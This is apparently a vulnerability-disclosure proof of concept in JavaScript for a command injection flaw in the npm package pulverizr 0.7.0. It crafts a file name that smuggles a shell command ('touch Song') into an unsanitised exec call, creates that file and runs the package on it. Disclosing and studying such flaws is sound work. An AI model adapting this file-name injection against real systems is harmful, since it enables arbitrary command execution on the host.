/**
 * pulverizr@0.7.0 is vulnerable to command injection.
 * The injection point is located in line 73 of file lib/job.js
 * the variable "filenmae" can be controlled by the attacker
 * This function use the variable "filename" to construct the 
 * argument of the exec call without any sanitization.
 *
 * But to make the exploit work, we need to new a file named
 * the attack command
 *
 * By this exploit, if we can generate a file, we can run any
 * command on the OS
 *
 */
var root = require("pulverizr");
var fs = require("fs");
var attack_code = "touch Song";

var injection_code = "\"&" + attack_code + "&\"a.jpg"
var inputs = [injection_code]
fs.writeFile(injection_code, "123", function(){});

var job = root.createJob(inputs, {});
job.run();
